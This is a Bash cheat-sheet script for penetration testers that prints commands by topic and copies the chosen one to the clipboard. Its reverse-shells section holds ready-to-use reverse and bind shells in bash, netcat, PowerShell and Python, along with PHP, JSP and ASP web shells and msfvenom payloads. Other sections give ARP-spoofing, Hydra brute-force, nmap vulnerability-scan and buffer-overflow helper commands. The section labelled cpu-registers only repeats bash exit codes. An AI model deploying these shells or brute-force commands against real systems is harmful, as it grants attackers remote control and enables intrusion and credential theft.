#!/bin/env bash
function print_options {
    echo 'Help with:'
    echo '├── reverse-shells'
    echo '├── upgrading-shells'
    echo '├── uploading-shells'
    echo '├── net-protocols'
    echo '├── arpspoof'
    echo '├── smbmap'
    echo '├── domain-osint'
    echo '├── nmap'
    echo '├── hydra'
    echo '├── gobuster'
    echo '├── nc'
    echo '├── git'
    echo '├── hacking'
    echo '├── gdb'
    echo '├── google-dorking'
    echo '├── cpu-registers'
    echo '├── bash-scripting'
    echo '├── ports-services'
    echo '└── http-codes'
}

function reverse-shells {
    tomcat_war='msfvenom -p java/jsp_shell_reverse_tcp LHOST=<local_IP> LPORT=<listening port> -f war > shell.war'
    echo "   ┌ tomcat war file REVERSE shell:"
    echo "1. $tomcat_war"

    rev_bash_sh_0="bash -c 'bash -i >& /dev/TCP/10.10.10.10/1234 0>&1'"
    echo "   ┌ REVERSE bash shell version 0:"
    echo "2. $rev_bash_sh_0"

    rev_bash_sh_1='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f'
    echo "   ┌ REVERSE bash shell version 1:"
    echo "3. $rev_bash_sh_1"

    rev_powershell_sh_0='powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    echo "   ┌ REVERSE powershell shell version 0:"
    echo "4. $rev_powershell_sh_0"

    bind_bash_sh_0='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f'
    echo "   ┌ BIND bash shell version 0:"
    echo "5. $bind_bash_sh_0"

    bind_python_sh_0="python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"
    echo "   ┌ BIND python shell version 0:"
    echo "6. $bind_python_sh_0"

    bind_powershell_sh_0='powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();'
    echo "   ┌ BIND powershell shell version 0:"
    echo "7. $bind_powershell_sh_0"

    php_web_shell_0="<?PHP system(\$_GET['cmd']);?>"
    echo "   ┌ php WEB shell version 0:"
    echo "8. $php_web_shell_0"

    jsp_web_shell_0='<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
    echo "   ┌ jsp WEB shell version 0:"
    echo "9. $jsp_web_shell_0"

    asp_web_shell_0='<% eval request("cmd") %>'
    echo "   ┌ asp WEB shell version 0:"
    echo "10. $asp_web_shell_0"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $tomcat_war | xclip -selection c;;
        2) echo -n $rev_bash_sh_0 | xclip -selection c;;
        3) echo -n $rev_bash_sh_1 | xclip -selection c;;
        4) echo -n $rev_powershell_sh_0 | xclip -selection c;;
        5) echo -n $bind_bash_sh_0 | xclip -selection c;;
        6) echo -n $bind_python_sh_0 | xclip -selection c;;
        7) echo -n $bind_powershell_sh_0 | xclip -selection c;;
        8) echo -n $php_web_shell_0 | xclip -selection c;;
        9) echo -n $jsp_web_shell_0 | xclip -selection c;;
        10) echo -n $asp_web_shell_0 | xclip -selection c;;
        *) exit 1;;
    esac
}

function upgrading-shells {
    python_stty="python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    echo "   ┌ python/stty method(in netcat broken shell)"
    echo "1. $python_stty; ; stty raw -echo; fg; reset"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $python_stty | xclip -selection c;;
        *) exit 1;;
    esac
}

function uploading-shells {
    printf '%7s - /var/www/html/\n' Apache
    printf '%7s - /usr/local/nginx/html/\n' Nginx
    printf '%7s - c:\\inetpub\\wwwroot\\\n' IIS
    printf '%7s - C:\\xampp\\htdocs\\\n' XAMPP
}

function net-protocols {
    echo "   ┌ Multicast DNS"
    echo "1. mdns"
    mdns_info='Multicast DNS (mDNS) is a protocol aimed at helping with name resolution in smaller networks. In doing so, it takes a different approach than the well-known DNS. Instead of querying a name server, all participants in the network are directly addressed.'

    echo "   ┌ Remote procedure call"
    echo "2. rpc"
    rpc_info='In distributed computing, a remote procedure call (RPC) is when a computer program causes a procedure (subroutine) to execute in a different address space (commonly on another computer on a shared network), which is coded as if it were a normal (local) procedure call, without the programmer explicitly coding the details for the remote interaction.\nThat is, the programmer writes essentially the same code whether the subroutine is local to the executing program, or remote.This is a form of client–server interaction (caller is client, executor is server), typically implemented via a request–response message-passing system.\nIn the object-oriented programming paradigm, RPCs are represented by remote method invocation (RMI). The RPC model implies a level of location transparency, namely that calling procedures are largely the same whether they are local or remote, but usually they are not identical, so local calls can be distinguished from remote calls.\nRemote calls are usually orders of magnitude slower and less reliable than local calls, so distinguishing them is important.'

    echo "   ┌ Server Message Block"
    echo "3. smb"
    smb_info="The Server Message Block (SMB) is a network protocol that enables users to communicate with remote computers and servers — to use their resources or share, open, and edit files. It's also referred to as the server/client protocol, as the server has a resource that it can share with the client."

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -e $mdns_info;;
        2) echo -e $rpc_info;;
        3) echo -e $smb_info;;
        *) exit 1;;
    esac
}

function arpspoof {
    IPv4_on='echo 1 > /proc/sys/net/ipv4/ip_forward'
    echo '   ┌ IPv4 must be enabled'
    echo "1. $IPv4_on"

    arpspoof='arpspoof -i eth0 -t <gateway> -r <target>'
    echo '   ┌ Basic example'
    echo "2. $arpspoof"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $IPv4_on | xclip -selection c;;
        2) echo -n $arpspoof | xclip -selection c;;
        *) exit 1;;
    esac
}

function smbmap {
    smbmap='smbmap -H $target'
    echo '   ┌ Enumerate remote host for available smb attributes:'
    echo "1. $smbmap"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $smbmap | xclip -selection c;;
        *) exit 1;;
    esac
}

function domain-osint {
    whois='whois -H <root_domain>'
    nslookup='nslookup <domain>'
    theHarvester='theHarvester -d <domain> -b <source>'
    dig='dig <domain>'
    host='host <hostname>'
    snmpwalk='snmpwalk <hostname>'
    whatweb='whatweb <hostname>'

    echo "   ┌ contact info/server addresses/other:"
    echo "1. $whois"
    echo "   ┌ resolve the hostname to an IP address:"
    echo "2. $nslookup"
    echo "   ┌ automated gathering of email addresses:"
    echo "3. $theHarvester"
    echo "   ┌ dns lookup utility:"
    echo "4. $dig"
    echo "   ┌ names enumeration:"
    echo "5. $host"
    echo "   ┌ info/statistics about router or device:"
    echo "6. $snmpwalk"
    echo "   ┌ web scanner:"
    echo "7. $whatweb"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $whois | xclip -selection c;;
        2) echo -n $nslookup | xclip -selection c;;
        3) echo -n $theHarvester | xclip -selection c;;
        4) echo -n $dig | xclip -selection c;;
        5) echo -n $host | xclip -selection c;;
        6) echo -n $snmpwalk | xclip -selection c;;
        7) echo -n $whatweb | xclip -selection c;;
        *) exit 1;;
    esac
}

function nmap {
    nmap_fast='nmap -sn -T5 $eth0_gateway/24'
    max_info_target='nmap -sS -A -O -p- -oN $target.scan $target'
    vulscan='nmap -sV --script=vulscan/vulscan --script-args vulscandb=exploitdb.csv $target'

    echo "   ┌ scan all network by gateway with subnet mask(default 24 bit):"
    echo "1. $nmap_fast"
    echo "   ┌ scan single target for max data && save to file:"
    echo "2. $max_info_target"
    echo "   ┌ scan target for common vulnerabilities from exploitdb databse:"
    echo "3. $vulscan"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $nmap_fast | xclip -selection c;;
        2) echo -n $max_info_target | xclip -selection c;;
        3) echo -n $vulscan | xclip -selection c;;
        *) exit 1;;
    esac
}

function hydra {
    ssh_bruteforce='hydra [-l|-L] <login/login_dict> [-p|-P] <pwd/pwd_dict> -s <port> <host> ssh -vV'
    http_basicauth='hydra [-l|-L] <login/login_dict> [-p|-P] <pwd/pwd_dict> -s <port> -f <host> http[s]-[post|get]-form /<login-page>'

    echo "   ┌ Bruteforce target's ssh service"
    echo "1. $ssh_bruteforce"
    echo "   ┌ Bruteforce basic access authentication"
    echo "2. $http_basicauth"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $ssh_bruteforce | xclip -selection c;;
        2) echo -n $http_basicauth | xclip -selection c;;
        *) exit 1;;
    esac
}

function gobuster {
    default_bf='gobuster dir -u <target> -w <wordlist> -t 150'

    echo "   ┌ Bruteforce url with wordlist"
    echo "1. $default_bf"
    
    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $default_bf | xclip -selection c;;
        *) exit 1;;
    esac
}

function nc {
    netcat_listener='nc -nlvp <port>'
    echo '   ┌ Catch reverse shell from exploited target:'
    echo "1. $netcat_listener"

    netcat_connect='nc $target <port>'
    echo '   ┌ Connect to bind shell on the exloited target:'
    echo "2. $netcat_connect"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $netcat_listener | xclip -selection c;;
        2) echo -n $netcat_connect | xclip -selection c;;
        *) exit 1;;
    esac
}

function git {
    git_rm_remote='git rm -r --cached <folder_name>'

    echo '   ┌ Remove object from remote repo, not local'
    echo "1. $git_rm_remote"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $git_rm_remote | xclip -selection c;;
        *) exit 1;;
    esac
}

function hacking {
    aslr_off='echo 0 > /proc/sys/kernel/randomize_va_space'
    bow_pattern_creation='/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <int_length>'
    offset_calc='/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <hex_memory_address>'
    rev_shell='msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 --platform linux --arch x86 --format c'
    bytes_sequence='\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'

    echo '   ┌ Disable ASLR for buffer overflows(0 - off/1 - partly on/2 - full randomization):'
    echo "1. $aslr_off"
    echo '   ┌ Create special pattern string for determination of offset in bow-vulnerable programs:'
    echo "2. $bow_pattern_creation"
    echo '   ┌ Pass memory address to get the exact offset:'
    echo "3. $offset_calc"
    echo '   ┌ Reverse shell malicious payload:'
    echo "4. $rev_shell"
    echo '   ┌ All bytes sequence:'
    echo "5. Copy to clipboard whole bytes sequence (\x00..\x7f..\xff)"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $aslr_off | xclip -selection c;;
        2) echo -n $bow_pattern_creation | xclip -selection c;;
        3) echo -n $offset_calc | xclip -selection c;;
        4) echo -n $rev_shell | xclip -selection c;;
        5) echo -n $bytes_sequence | xclip -selection c;;
        *) exit 1;;
    esac
}

function gdb {
    stack_examination="x/2000xb \$esp+-500"
    get_info_about_process="info proc all"

    echo '   ┌ Examine stack bytes'
    echo "1. (gdb) $stack_examination"
    echo '   ┌ Get info about stack size'
    echo "2. (gdb) $get_info_about_process"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $stack_examination | xclip -selection c;;
        2) echo -n $get_info_about_process | xclip -selection c;;
        *) exit 1;;
    esac
}

function google-dorking {
    echo "Google-dorking basic queries:"
    echo "├── cache:[url] - Shows the version of the web page from the search engine’s cache."
    echo "├── related:[url] - Finds web pages that are similar to the specified web page."
    echo "├── info:[url] - Presents some information that Google has about a web page, including similar pages, the cached version of the page, and sites linking to the page."
    echo "├── site:[url] - Finds pages only within a particular domain and all its subdomains."
    echo "├── intitle:[text] or allintitle:[text] - Finds pages that include a specific keyword as part of the indexed title tag. You must include a space between the colon and the query for the operator to work in Bing."
    echo "├── allinurl:[text] - Finds pages that include a specific keyword as part of their indexed URLs."
    echo "├── meta:[text] - Finds pages that contain the specific keyword in the meta tags."
    echo "├── filetype:[file extension] - Searches for specific file types."
    echo "├── intext:[text], allintext:[text], inbody:[text] - Searches text of page. For Bing and Yahoo the query is inbody:[text]. For DuckDuckGo the query is intext:[text]. For Google either intext:[text] or allintext:[text] can be used."
    echo "├── inanchor:[text] - Search link anchor text"
    echo "├── location:[iso code] or loc:[iso code], region:[region code] - Search for specific region."
    echo "├── contains:[text] - Identifies sites that contain links to filetypes specified (i.e. contains:pdf)"
    echo "├── altloc:[iso code] - Searches for location in addition to one specified by language of site (i.e. pt-us or en-us)"
    echo "├── feed:[feed type, i.e. rss] - Find RSS feed related to search term"
    echo "├── hasfeed:[url] - Finds webpages that contain both the term or terms for which you are querying and one or more RSS or Atom feeds."
    echo "├── ip:[ip address] - Find sites hosted by a specific ip address"
    echo "├── language:[language code] - Returns websites that match the search term in a specified language"
    echo "├── book:[title] - Searches for book titles related to keywords"
    echo "├── maps:[location] - Searches for maps related to keywords"
    echo "└── kfromdomain:[url] - Shows websites whose links are mentioned in the specified url (with errors)"
}

function cpu-registers {
    printf 'Error codes:\n'
    printf '%6s - catchall for general errors let "var1 = 1/0"\n' 1
    printf '%6s - misuse of shell builtins, according to Bash documentation\n' 2
    printf '%6s - command invoked cannot execute\n' 126
    printf '%6s - "command not found"\n' 127
    printf '%6s - invalid argument to exit\n' 128
    printf '%6s - fatal error signal "n"\n' 128+n
    printf '%6s - script terminated by Control-C\n' 130
    printf '%6s - exit status out of range\n' 255
}

function bash-scripting {
    printf 'Error codes:\n'
    printf '%6s - catchall for general errors let "var1 = 1/0"\n' 1
    printf '%6s - misuse of shell builtins, according to Bash documentation\n' 2
    printf '%6s - command invoked cannot execute\n' 126
    printf '%6s - "command not found"\n' 127
    printf '%6s - invalid argument to exit\n' 128
    printf '%6s - fatal error signal "n"\n' 128+n
    printf '%6s - script terminated by Control-C\n' 130
    printf '%6s - exit status out of range\n' 255
}

function ports-services {
    printf 'Ports - services:\n'
    printf "%5s - tcpmux TCP port service multiplexer\n" 1
    printf "%5s - rje Remote Job Entry\n" 5
    printf "%5s - echo Echo service\n" 7
    printf "%5s - discard Null service for connection testing\n" 9
    printf "%5s - systat System Status service for listing connected ports\n" 11
    printf "%5s - daytime Sends date and time to requesting host\n" 13
    printf "%5s - qotd Sends quote of the day to connected host\n" 17
    printf "%5s - msp Message Send Protocol\n" 18
    printf "%5s - chargen Character Generation service; sends endless stream of characters\n" 19
    printf "%5s - ftp-data FTP data port\n" 20
    printf "%5s - ftp File Transfer Protocol (FTP) port; sometimes used by File Service Protocol (FSP)\n" 21
    printf "%5s - ssh Secure Shell (SSH) service\n" 22
    printf "%5s - telnet The Telnet service\n" 23
    printf "%5s - smtp Simple Mail Transfer Protocol (SMTP)\n" 25
    printf "%5s - time Time Protocol\n" 37
    printf "%5s - rlp Resource Location Protocol\n" 39
    printf "%5s - nameserver Internet Name Service\n" 42
    printf "%5s - nicname WHOIS directory service\n" 43
    printf "%5s - tacacs Terminal Access Controller Access Control System for TCP/IP based authentication and access\n" 49
    printf "%5s - re-mail-ck Remote Mail Checking Protocol\n" 50
    printf "%5s - domain domain name services (such as BIND)\n" 53
    printf "%5s - whois++ WHOIS++, extended WHOIS services\n" 63
    printf "%5s - bootps Bootstrap Protocol (BOOTP) services; also used by Dynamic Host Configuration Protocol (DHCP) services\n" 67
    printf "%5s - bootpc Bootstrap (BOOTP) client; also used by Dynamic Host Control Protocol (DHCP) clients\n" 68
    printf "%5s - tftp Trivial File Transfer Protocol (TFTP)\n" 69
    printf "%5s - gopher Gopher Internet document search and retrieval\n" 70
    printf "%5s - netrjs-1 Remote Job Service\n" 71
    printf "%5s - netrjs-2 Remote Job Service\n" 72
    printf "%5s - netrjs-3 Remote Job Service\n" 73
    printf "%5s - netrjs-4 Remote Job Service\n" 73
    printf "%5s - finger Finger service for user contact information\n" 79
    printf "%5s - http HyperText Transfer Protocol (HTTP) for World Wide Web (WWW) services\n" 80
    printf "%5s - kerberos Kerberos network authentication system\n" 88
    printf "%5s - supdup Telnet protocol extension\n" 95
    printf "%5s - hostname Hostname services on SRI-NIC machines\n" 101
    printf "%5s - tcp/iso-tsap iso-tsap ISO Development Environment (ISODE) network applications\n" 102
    printf "%5s - csnet-ns Mailbox nameserver; also used by CSO nameserver\n" 105
    printf "%5s - rtelnet Remote Telnet\n" 107
    printf "%5s - pop2 Post Office Protocol version 2\n" 109
    printf "%5s - pop3 Post Office Protocol version 3\n" 110
    printf "%5s - sunrpc Remote Procedure Call (RPC) Protocol for remote command execution, used by Network Filesystem (NFS)\n" 111
    printf "%5s - auth Authentication and Ident protocols\n" 113
    printf "%5s - sftp Secure File Transfer Protocol (SFTP) services\n" 115
    printf "%5s - uucp-path Unix-to-Unix Copy Protocol (UUCP) Path services\n" 117
    printf "%5s - nntp Network News Transfer Protocol (NNTP) for the USENET discussion system\n" 119
    printf "%5s - ntp Network Time Protocol (NTP)\n" 123
    printf "%5s - netbios-ns NETBIOS Name Service used in Red Hat Enterprise Linux by Samba\n" 137
    printf "%5s - netbios-dgm NETBIOS Datagram Service used in Red Hat Enterprise Linux by Samba\n" 138
    printf "%5s - netbios-ssn NETBIOS Session Service used in Red Hat Enterprise Linux by Samba\n" 139
    printf "%5s - imap Internet Message Access Protocol (IMAP)\n" 143
    printf "%5s - snmp Simple Network Management Protocol (SNMP)\n" 161
    printf "%5s - snmptrap Traps for SNMP\n" 162
    printf "%5s - cmip-man Common Management Information Protocol (CMIP)\n" 163
    printf "%5s - cmip-agent Common Management Information Protocol (CMIP)\n" 164
    printf "%5s - mailq MAILQ email transport queue\n" 174
    printf "%5s - xdmcp X Display Manager Control Protocol (XDMCP)\n" 177
    printf "%5s - nextstep NeXTStep window server\n" 178
    printf "%5s - bgp Border Gateway Protocol\n" 179
    printf "%5s - prospero Prospero distributed filesystem services\n" 191
    printf "%5s - irc Internet Relay Chat (IRC)\n" 194
    printf "%5s - smux SNMP UNIX Multiplexer\n" 199
    printf "%5s - at-rtmp AppleTalk routing\n" 201
    printf "%5s - at-nbp AppleTalk name binding\n" 202
    printf "%5s - at-echo AppleTalk echo\n" 204
    printf "%5s - at-zis AppleTalk zone information\n" 206
    printf "%5s - qmtp Quick Mail Transfer Protocol (QMTP)\n" 209
    printf "%5s - z39.50 NISO Z39.50 database\n" 210
    printf "%5s - ipx Internetwork Packet Exchange (IPX), a datagram protocol commonly used in Novell Netware environments\n" 213
    printf "%5s - imap3 Internet Message Access Protocol version 3\n" 220
    printf "%5s - link LINK / 3-DNS iQuery service\n" 245
    printf "%5s - fatserv FATMEN file and tape management server\n" 347
    printf "%5s - rsvp_tunnel RSVP Tunnel\n" 363
    printf "%5s - rpc2portmap Coda file system portmapper\n" 369
    printf "%5s - codaauth2 Coda file system authentication services\n" 370
    printf "%5s - ulistproc UNIX LISTSERV\n" 372
    printf "%5s - ldap Lightweight Directory Access Protocol (LDAP)\n" 389
    printf "%5s - svrloc Service Location Protocol (SLP)\n" 427
    printf "%5s - mobileip-agent Mobile Internet Protocol (IP) agent\n" 434
    printf "%5s - mobilip-mn Mobile Internet Protocol (IP) manager\n" 435
    printf "%5s - https Secure Hypertext Transfer Protocol (HTTP)\n" 443
    printf "%5s - snpp Simple Network Paging Protocol\n" 444
    printf "%5s - microsoft-ds Server Message Block (SMB) over TCP/IP\n" 445
    printf "%5s - kpasswd Kerberos password and key changing services\n" 464
    printf "%5s - photuris Photuris session key management protocol\n" 468
    printf "%5s - saft Simple Asynchronous File Transfer (SAFT) protocol\n" 487
    printf "%5s - gss-http Generic Security Services (GSS) for HTTP\n" 488
    printf "%5s - pim-rp-disc Rendezvous Point Discovery (RP-DISC) for Protocol Independent Multicast (PIM) services\n" 496
    printf "%5s - isakmp Internet Security Association and Key Management Protocol (ISAKMP)\n" 500
    printf "%5s - iiop Internet Inter-Orb Protocol (IIOP)\n" 535
    printf "%5s - gdomap GNUstep Distributed Objects Mapper (GDOMAP)\n" 538
    printf "%5s - dhcpv6-client Dynamic Host Configuration Protocol (DHCP) version 6 client\n" 546
    printf "%5s - dhcpv6-server Dynamic Host Configuration Protocol (DHCP) version 6 Service\n" 547
    printf "%5s - rtsp Real Time Stream Control Protocol (RTSP)\n" 554
    printf "%5s - nntps Network News Transport Protocol over Secure Sockets Layer (NNTPS)\n" 563
    printf "%5s - whoami whoami user ID listing\n" 565
    printf "%5s - submission Mail Message Submission Agent (MSA)\n" 587
    printf "%5s - npmp-local Network Peripheral Management Protocol (NPMP) local / Distributed Queueing System (DQS)\n" 610
    printf "%5s - npmp-gui Network Peripheral Management Protocol (NPMP) GUI / Distributed Queueing System (DQS)\n" 611
    printf "%5s - hmmp-ind HyperMedia Management Protocol (HMMP) Indication / DQS\n" 612
    printf "%5s - ipp Internet Printing Protocol (IPP)\n" 631
    printf "%5s - ldaps Lightweight Directory Access Protocol over Secure Sockets Layer (LDAPS)\n" 636
    printf "%5s - acap Application Configuration Access Protocol (ACAP)\n" 674
    printf "%5s - ha-cluster Heartbeat services for High-Availability Clusters\n" 694
    printf "%5s - kerberos-adm Kerberos version 5 (v5) 'kadmin' database administration\n" 749
    printf "%5s - kerberos-iv Kerberos version 4 (v4) services\n" 750
    printf "%5s - webster Network Dictionary\n" 765
    printf "%5s - phonebook Network Phonebook\n" 767
    printf "%5s - rsync rsync file transfer services\n" 873
    printf "%5s - telnets Telnet over Secure Sockets Layer (TelnetS)\n" 992
    printf "%5s - imaps Internet Message Access Protocol over Secure Sockets Layer (IMAPS)\n" 993
    printf "%5s - ircs Internet Relay Chat over Secure Sockets Layer (IRCS)\n" 994
    printf "%5s - pop3s Post Office Protocol version 3 over Secure Sockets Layer (POP3S)\n" 995
}

function http-codes {
    echo "http-codes:
    ├── 1×× Informational
    |   ├── 100 Continue
    |   ├── 101 Switching Protocols
    |   └── 102 Processing
    ├── 2×× Success
    |   ├── 200 OK
    |   ├── 201 Created
    |   ├── 202 Accepted
    |   ├── 203 Non-authoritative Information
    |   ├── 204 No Content
    |   ├── 205 Reset Content
    |   ├── 206 Partial Content
    |   ├── 207 Multi-Status
    |   ├── 208 Already Reported
    |   └── 226 IM Used
    ├── 3×× Redirection
    |   ├── 300 Multiple Choices
    |   ├── 301 Moved Permanently
    |   ├── 302 Found
    |   ├── 303 See Other
    |   ├── 304 Not Modified
    |   ├── 305 Use Proxy
    |   ├── 307 Temporary Redirect
    |   └── 308 Permanent Redirect
    ├── 4×× Client Error
    |   ├── 400 Bad Request
    |   ├── 401 Unauthorized
    |   ├── 402 Payment Required
    |   ├── 403 Forbidden
    |   ├── 404 Not Found
    |   ├── 405 Method Not Allowed
    |   ├── 406 Not Acceptable
    |   ├── 407 Proxy Authentication Required
    |   ├── 408 Request Timeout
    |   ├── 409 Conflict
    |   ├── 410 Gone
    |   ├── 411 Length Required
    |   ├── 412 Precondition Failed
    |   ├── 413 Payload Too Large
    |   ├── 414 Request-URI Too Long
    |   ├── 415 Unsupported Media Type
    |   ├── 416 Requested Range Not Satisfiable
    |   ├── 417 Expectation Failed
    |   ├── 418 I'm a teapot
    |   ├── 421 Misdirected Request
    |   ├── 422 Unprocessable Entity
    |   ├── 423 Locked
    |   ├── 424 Failed Dependency
    |   ├── 426 Upgrade Required
    |   ├── 428 Precondition Required
    |   ├── 429 Too Many Requests
    |   ├── 431 Request Header Fields Too Large
    |   ├── 444 Connection Closed Without Response
    |   ├── 451 Unavailable For Legal Reasons
    |   └── 499 Client Closed Request
    └── 5×× Server Error
        ├── 500 Internal Server Error
        ├── 501 Not Implemented
        ├── 502 Bad Gateway
        ├── 503 Service Unavailable
        ├── 504 Gateway Timeout
        ├── 505 HTTP Version Not Supported
        ├── 506 Variant Also Negotiates
        ├── 507 Insufficient Storage
        ├── 508 Loop Detected
        ├── 510 Not Extended
        ├── 511 Network Authentication Required
        └── 599 Network Connect Timeout Error"
}

function audit-support {
    aslr_off='echo 0 > /proc/sys/kernel/randomize_va_space'
    echo '   ┌ Disable ASLR for buffer overflows(0 - off/1 - partly on/2 - full randomization):'
    echo "1. $aslr_off"

    read -t 60 -p 'State your choice: ' choice
    case $choice in
        1) echo -n $aslr_off | xclip -selection c;;
        *) exit 1;;
    esac
}

if [[ -z $1 ]]; then
    print_options
fi

if [[ $1 ]]; then
    case $1 in
        "reverse-shells") reverse-shells;;
        "upgrading-shells") upgrading-shells;;
        "uploading-shells") uploading-shells;;
        "net-protocols") net-protocols;;
        "arpspoof") arpspoof;;
        "smbmap") smbmap;;
        "domain-osint") domain-osint;;
        "nmap") nmap;;
        "hydra") hydra;;
        "gobuster") gobuster;;
        "nc") nc;;
        "git") git;;
        "hacking") hacking;;
        "gdb") gdb;;
        "google-dorking") google-dorking;;
        "cpu-registers") cpu-registers;;
        "bash-scripting") bash-scripting;;
        "ports-services") ports-services;;
        "http-codes") http-codes;;
        "audit-support") audit-support;;
        *) print_options;;
    esac
fi
